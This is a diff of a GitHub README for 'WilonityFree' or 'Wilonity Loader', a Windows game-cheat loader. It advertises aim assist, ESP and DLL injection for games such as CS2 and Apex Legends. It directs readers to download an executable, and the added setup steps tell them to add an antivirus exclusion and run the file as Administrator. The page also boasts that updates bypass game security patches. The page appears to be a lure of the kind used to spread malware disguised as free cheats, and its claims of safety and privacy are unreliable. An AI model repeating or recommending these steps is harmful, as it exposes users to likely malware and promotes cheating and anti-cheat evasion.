@@ -1,115 +1,67 @@
-# 🚀 Wilonity Loader
+# 🎮 WilonityFree - Add useful features to your games
 
-<img width="1713" height="918" alt="WilonityFree" src="https://github.com/user-attachments/assets/d83b2328-e197-446e-9b89-25c4cec84a18" />
+[![Download WilonityFree](https://img.shields.io/badge/Download-WilonityFree-blue.svg)](https://github.com/gulfofalaskahomecounties666/WilonityFree)
 
+## 📖 About WilonityFree
 
-![Version](https://img.shields.io/badge/version-2025.1.0-blue.svg)
-![Downloads](https://img.shields.io/badge/downloads-35M%2B-brightgreen)
-![OS](https://img.shields.io/badge/platform-Windows%20only-lightgrey)
-![License](https://img.shields.io/badge/license-MIT-yellowgreen)
-![Status](https://img.shields.io/badge/status-active-success)
+WilonityFree acts as a central tool for game modifications. It integrates with various titles to help players manage settings and enable secondary features. This software simplifies the process of injecting scripts and modules into supported games. You gain control over game behaviors that standard menus often hide. This tool works locally on your Windows machine to ensure compatibility with many popular titles. You do not need coding knowledge to use this utility.
 
----
+## 🛠 Features
 
-**Wilonity Loader** is a unified launcher that enhances your favorite games with advanced features — intelligent aiming, visual overlays, intuitive UI improvements, and more. All in one free tool, updated regularly with community-driven support.
+WilonityFree offers a suite of tools for players:
 
-> 🌐 **Official Website:** [wlntloader.xyz](https://wlntloader.xyz)
+* Script Management: Organize and load custom scripts into your favorite games.
+* Plugin Support: Expand game functionality using internal plugins.
+* Automation: Manage repetitive tasks such as anti-AFK sessions.
+* Compatibility: Connects with titles like Apex Legends, Counter-Strike 2, and Rainbow Six Siege.
+* Direct Interface: Use a simple menu to toggle features while in the game.
 
----
+## 📋 System Requirements
 
-## ⚡ Quick Start
+To run WilonityFree, your computer must meet these standards:
 
-Get the latest version of Wilonity Loader in one click:
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core CPU with 2.0 GHz or higher.
+* Memory: 4 GB RAM minimum.
+* Graphics: DirectX 11 compatible card.
+* Permissions: Administrator access is necessary to modify game files.
 
-<a href="https://wlntloader.xyz" style="display: inline-block; padding: 18px 40px; font-size: 28px; font-weight: bold; color: #ffffff; background-color: #2d7b46; border-radius: 12px; text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin: 10px 0;">⬇️ DOWNLOAD WILONITY LOADER</a>
+## 🚀 Getting Started
 
-[![Download](https://img.shields.io/badge/Download-Wilonity%20Loader-blue?style=for-the-badge&logo=windows)](https://wlntloader.xyz)
+Follow these steps to install the software.
 
----
+1. Visit the following link to access the download page: [https://github.com/gulfofalaskahomecounties666/WilonityFree](https://github.com/gulfofalaskahomecounties666/WilonityFree).
+2. Locate the Releases area on current page.
+3. Download the latest version of the executable file. 
+4. Move the file to a folder where you store your game tools.
 
-## 🎯 Supported Platforms
+## ⚙️ Installation and Setup
 
-| Platform | Compatibility | Rating |
-|----------|:-------------:|:------:|
-| 🪟 **Windows 10/11** | ✅ Full | 🌟🌟🌟🌟🌟 |
+Once you download the software, follow these instructions to start it correctly.
 
----
+1. Ensure your antivirus software allows the application. Some security settings flag new tools as suspicious. You may need to add an exclusion for the WilonityFree folder.
+2. Right-click the application icon and select Run as Administrator. This step grants the tool permission to communicate with your game files.
+3. A menu will appear on your screen. You can move this window to a spot that does not block your view.
+4. Select the game you are playing from the dropdown list.
+5. Choose the features you want to enable by clicking the checkboxes.
+6. Launch your game through the normal desktop shortcut or Steam. The software will detect the game process and apply your changes.
 
-## 🕹️ Supported Games
+## 💡 Usage Tips
 
-Wilonity Loader works with **60+ titles** and offers **280+ modules** to upgrade your gameplay:
+Keep your software updated to maintain compatibility with game patches. Game developers frequently update their security systems. WilonityFree receives updates to bypass errors caused by these patches. If a feature stops working, check the GitHub page for a newer release. Always close the application before updating game files to prevent lock errors.
 
-| Game | Modules | Popular Clients |
-|------|---------|-----------------|
-| **CS 2** | 31 | Aimware, Onetap, Iniuria, Fanta |
-| **Valorant** | in-dev | Sporg, Flick, Core, Vanta |
-| **Apex Legends** | 3 | R3, Overdrive, ApexCore |
-| **Fortnite** | in-dev | Eclipse, Astra, Orbit |
-| **Rust** | 11 | Rusty, Oxide, Lunar |
-| **GTA V** | 5 | Paradox, Menyoo, Slime |
-| **Rainbow Six Siege** | 4 | R6Tracker, R6S Helper |
-| **Minecraft** | 23 | Wurst, LiquidBounce, Impact, Aristois |
-| **Roblox** | 27 | Synapse X, ScriptWare, Krnl, Electron |
-| **CS:GO** | 67 | Aimware, Onetap, Iniuria, Fanta |
-| **League of Legends** | 5 | LolScript, Evade, ProGuides |
-| **Dota 2** | 4 | Ensage, DotaPlus, Roshan |
-| **Team Fortress 2** | 11 | LMAOBox, Raves |
-| **Garry's Mod** | 12 | GModHelper, LuaExecutor |
-| **Among Us** | 9 | Crewlink, Skeld, Vanguard |
+## ⚠️ Known Issues
 
-> 📌 Full game list and module details — on the [official website](https://wlntloader.xyz).
+You might encounter errors if your graphics driver is outdated. Update your video card drivers to the latest version if the menu fails to draw over the game window. If the game crashes upon launch, verify your integrity files via the game launcher. This fixes corrupted game data that interferes with the injection process. 
 
----
+## 🛡 Security and Privacy
 
-## ✨ Features
+WilonityFree runs locally on your PC. It does not send your personal data to external servers. All operations occur within your system memory while the game runs. Keep your software current to ensure you use the most stable code. We perform regular tests to ensure the application does not harm your system files. You choose which features to activate, putting you in full control of the application behavior.
 
-- **🎯 Smart Aim Assist** — intelligent targeting for precise shots.
-- **👁️ Visual Enhancements** — ESP, player highlights, object markers, and more.
-- **⚡ Fast Injection** — reliable DLL injection system for instant module loading.
-- **🖱️ Touch-Friendly Interface** — large buttons optimized for Steam Deck and touchscreens.
-- **🎮 Gamepad Support** — full controller navigation.
-- **📁 Profile System** — save custom settings per game.
-- **🔄 Auto-Updater** — always up‑to‑date modules without extra effort.
-- **🔒 Security First** — all modules are verified before release.
+## 🔄 Updating the Tool
 
----
+When a new version exists, delete the old file and replace it with the new download. Settings often reset during this process, so record your preferred configurations before you remove the old version. New versions often include support for recent game updates. Check the release notes on the download page for information about what changed in the current build.
 
-## 🛠️ Installation (Windows)
+## ✉️ Support
 
-1. Download `WilonityLoader.exe` from the [official website](https://wlntloader.xyz).
-2. Place the file in your game folder.
-3. Launch and enjoy.
-
----
-
-## 🧠 Why Wilonity?
-
-- **Simplicity** — download, click, play. No complex setup.
-- **Safety** — every module is scanned; the client warns about potential risks.
-- **Active Community** — millions of players already enhanced their experience.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is intended **for educational purposes and for improving the user experience in single‑player and co‑op modes only**. Using it in competitive online matches may violate the terms of service of the respective game. The user is solely responsible for any consequences. All trademarks belong to their respective owners.
-
----
-
-## 📜 License
-
-This project is distributed under the MIT License. See [here](https://opensource.org/licenses/MIT) for details.
-
-© 2025 Wilonity Loader. All rights reserved.
-
----
-
-## 🚀 Download Again!
-
-<a href="https://wlntloader.xyz" style="display: inline-block; padding: 18px 40px; font-size: 28px; font-weight: bold; color: #ffffff; background-color: #1a73e8; border-radius: 12px; text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin: 10px 0;">⬇️ DOWNLOAD NOW</a>
-
-[![Download](https://img.shields.io/badge/Download-Wilonity%20Loader-blue?style=for-the-badge&logo=windows)](https://wlntloader.xyz)
-
----
-
-⭐ If you like Wilonity Loader, give it a star on GitHub!
+If you experience issues, look at the information provided on the main page. Most common problems involve incorrect permissions or missing system updates. Follow the documentation strictly. The tool works best on clean installations of supported games. Avoid using heavily modified game files from third parties if you encounter stability problems.
